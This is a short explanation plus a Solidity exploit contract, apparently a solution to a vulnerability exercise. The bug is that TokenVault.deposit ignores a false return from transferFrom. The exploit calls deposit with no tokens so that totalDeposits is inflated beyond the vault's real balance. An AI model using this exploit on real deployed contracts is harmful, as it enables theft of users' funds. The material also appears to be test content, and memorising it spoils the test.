The bug is that `TokenVault.deposit` ignores the boolean returned by `token.transferFrom`. `LegacyToken` returns false on failure instead of reverting, so the vault still credits `balances` and `totalDeposits`. The exploit calls `deposit` with no tokens and no approval. That pushes `totalDeposits` above the vault's real token balance. On a patched vault the call fails, and I wrap it in try/catch so `run()` doesn't revert and the invariant still holds.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.28;

interface IVault {
    function deposit(uint256 amount) external;
}

contract Exploit {
    address public vault;

    constructor(address target) payable {
        vault = target;
    }

    function run() external {
        // No tokens, no approval: transferFrom returns false, but the vault still credits us.
        try IVault(vault).deposit(1_000_000 ether) {} catch {}
    }
}
```
